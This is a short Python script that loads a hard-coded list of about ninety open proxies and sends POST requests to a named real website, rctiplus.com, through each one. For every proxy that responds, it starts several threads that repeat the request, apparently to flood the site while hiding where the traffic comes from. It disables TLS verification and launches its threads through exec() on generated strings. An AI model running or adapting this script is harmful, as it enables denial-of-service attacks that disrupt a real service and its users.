import requests
import os
import threading
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#==============================please install befor running -> pip install urllib3==1.23=================================


#define max retry
requests.adapters.DEFAULT_RETRIES = 2

proxy = """
47.74.152.29:8888,
47.91.111.166:28737,
20.87.216.232:8000,
110.74.199.16:63141,
20.113.137.1:8000,
136.243.134.87:80,
8.209.127.181:1080,
66.175.223.147:4153,
162.55.186.193:13045,
20.87.222.220:8000,
45.79.90.143:3128,
162.55.187.45:13045,
46.246.84.3:8888,
146.196.48.2:80,
8.209.246.6:80,
133.18.201.9:8080,
159.138.166.178:3128,
94.74.111.50:3128,
20.87.215.175:8000,
178.79.191.47:54417,
172.105.25.190:8020,
173.255.209.155:1080,
200.105.215.18:33630,
47.88.50.230:3128,
47.254.247.192:4153,
8.214.4.72:33080,
80.48.119.28:8080,
143.244.132.11:80,
133.18.227.47:8080,
207.46.228.129:8000,
207.46.237.37:8000,
198.59.191.234:8080,
133.18.233.207:8080,
133.18.203.171:8080,
185.61.152.137:8080,
165.154.243.252:80,
139.59.1.14:3128,
165.154.243.154:80,
165.154.236.59:80,
165.154.235.178:80,
165.154.235.76:80,
65.21.141.242:10100,
138.68.235.51:80,
165.154.226.12:80,
139.99.237.62:80,
118.238.12.55:80,
20.111.54.16:80,
165.154.226.242:80,
129.154.54.57:3128,
49.207.36.81:80,
20.110.214.83:80,
121.1.41.162:111,
78.154.180.52:81,
133.18.203.28:8080,
150.109.32.166:80,
169.57.1.85:8123,
133.18.239.64:8080,
51.15.242.202:8888,
20.210.113.32:8123,
8.219.97.248:80,
20.24.43.214:8123,
130.41.55.190:8080,
130.41.15.76:8080,
187.216.90.46:53281,
20.206.106.192:8123,
20.87.219.39:8000,
20.87.215.212:8000,
58.27.59.249:80,
13.40.100.15:80,
143.198.182.218:80,
133.18.173.81:8080,
133.18.172.217:8080,
20.205.205.175:8000,
78.28.152.111:80,
104.192.4.241:8118,
103.151.246.46:8080,
47.91.42.219:30001,
8.213.137.21:6969,
20.113.143.34:8000,
20.213.51.246:8000,
94.103.85.88:9300,
47.56.69.11:8000,
20.87.223.154:8000,
20.24.83.157:8000,
20.87.74.129:8000,
20.87.10.146:8000,
198.49.68.80:80,
165.154.226.95:80,
43.255.113.232:8082,
78.20.209.210:443,
173.82.149.243:8080,
47.250.47.37:1100,
"""

def prepare_proxy_url():
    global proxy
    proxy = proxy.split(',')[:-1]
    proxy_http = ["http://" + i.replace('\n', "") for i in proxy]
    proxy_https = ["https://" + i.replace('\n', "") for i in proxy]
    return  proxy_https, proxy_http


def do_get_request(px):
    try:
        s = requests.Session()
        g = s.post("http://www.rctiplus.com", proxies=px, verify=False)
        s.close()
        if g.status_code == 200:
            print("thread: success with proxy:", px)
    except Exception as e:
        pass

proxy_https, proxy_http = prepare_proxy_url()
for ip in range(len(proxy_http)):
    px = {"http":proxy_http[ip], "https":proxy_https[ip]}
    try:
        s = requests.Session()
        g = s.post("http://www.rctiplus.com", proxies=px, timeout=20, verify=False)
        s.close()
        if g.status_code == 200:
            thread = []
            t_start = []
            t_join = []
            print("start threading for ip: ", proxy_http[ip])

            try:
                cpuCount = os.cpu_count() - 1
                for count in range(cpuCount):
                    thread.append(f"t{count} = threading.Thread(target=do_get_request, args=(px,))")
                    t_join.append(f"t{count}.join()")
                    t_start.append(f"t{count}.start()")
                for t in thread:
                    exec(t)
                for t_s in t_start:
                    exec(t_s)
                for t_j in t_join:
                    exec(t_j)
            except Exception as e:
                pass
            finally:
                continue
    except Exception as e:
        pass



